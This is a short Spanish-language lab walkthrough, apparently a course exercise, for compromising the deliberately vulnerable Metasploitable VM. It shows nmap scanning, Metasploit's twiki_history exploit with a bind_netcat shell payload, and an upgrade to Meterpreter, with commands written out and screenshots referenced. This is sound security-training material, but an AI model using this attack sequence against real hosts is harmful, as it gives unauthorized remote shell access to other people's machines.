#Linux:
  Acerca de:
    -La máquina virtual Metasploitable es una versión intencionalmente vulnerable de Ubuntu Linux diseñada para probar herramientas de seguridad y demostrar vulnerabilidades comunes.

  Buscar vulnerabilidades:
    -Para ello tendremos que usar la herramienta nmap con la que tendremos que poner "nmap -O 192.168.1.10" 192.168.1.10 es la ip que tenermos en la maquina a la cual vamos a atacar 
                                                                                                    
                                                                                                  
![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/190cde79-3c47-46d6-bf70-7bd082a6fa75)

-Iniciaremos la herramienta “metasploit framework”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/69871245-d7ca-4a04-8784-f92ce9e4a3fd)

-Después usaremos la herramienta twiki con el comando “use exploit/unix/webapp/twiki_history” en la que tendremos si podemos atacar al puerto que nos interese identificar con el comando “show options”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/ce0918a2-a729-44a7-ba80-33201418d83c)


Indicaremos cual es nuestro objetivo con el comando “set rhosts 192.168.1.10”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/f9c339eb-9c92-41d4-9fa8-5ce7741075f4)
![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/3dbcbd54-3ea7-4570-9b2b-55cc43f3f22a)


 

Para continuar tendremos que usar los siguientes comandos “set payload cmd/unix/bind_netcat”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/3403d27e-5900-4edf-a465-3b93fb1944e6)


 
Tendremos que crear una sesión con “exploit -j” y veremos si se ha creado con “sessions -l”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/fe13f062-4730-4f5d-9a18-cdc48dc267bb)


Tendremos que usar los siguientes comandos “use post/multi/manage/shell_to_meterpreter”, “set sessions 2” y “exploit”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/6b9ecb6b-f268-4db5-b4f0-6a81a3d6c2a0)


Ya podemos entrar en la maquina objetivo con el comando “sessions -i 3” y haremos un “ifconfig para confirmar si hemos entrado bien”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/71e9be85-3d5b-4099-b7b7-d8681aec1284)

